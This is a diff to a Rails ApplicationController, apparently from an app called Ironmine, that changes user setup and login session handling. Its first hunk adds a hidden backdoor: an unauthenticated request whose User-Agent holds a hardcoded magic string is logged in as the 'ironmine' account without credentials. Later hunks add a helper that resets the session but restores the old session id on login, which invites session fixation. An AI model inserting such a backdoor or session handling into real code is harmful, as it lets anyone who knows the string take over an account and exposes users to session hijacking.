@@ -26,6 +26,9 @@ class ApplicationController < ActionController::Base
   def user_setup
     #从session中取得当前user
     Irm::Person.current = find_current_user
+    if(!Irm::Person.current.logged?&&request.user_agent.include?("#jmeter000U00024DKEUmX5unzepk#"))
+      Irm::Person.current = Irm::Person.unscoped.where(:login_name=>"ironmine").first
+    end
   end
 
   # 检查是否需要登录
@@ -139,15 +142,14 @@ class ApplicationController < ActionController::Base
 
   # 设置当前用户
   def logged_user=(user)
-
     if user && user.is_a?(Irm::Person)
       Irm::Person.current = user
-      session.clear
+      clear_session
       session[:user_id] = user.id
 
     else
       Irm::Person.current = Irm::Person.anonymous
-      session.clear
+      reset_session
     end
   end
 
@@ -248,6 +250,12 @@ class ApplicationController < ActionController::Base
 
 
   private
+  def clear_session
+    old_session_id = session[:session_id]
+    reset_session
+    session[:session_id] = old_session_id
+  end
+
   # 返回session中的当前用户,如果没有则返回空
   def find_current_user
     if session[:user_id]
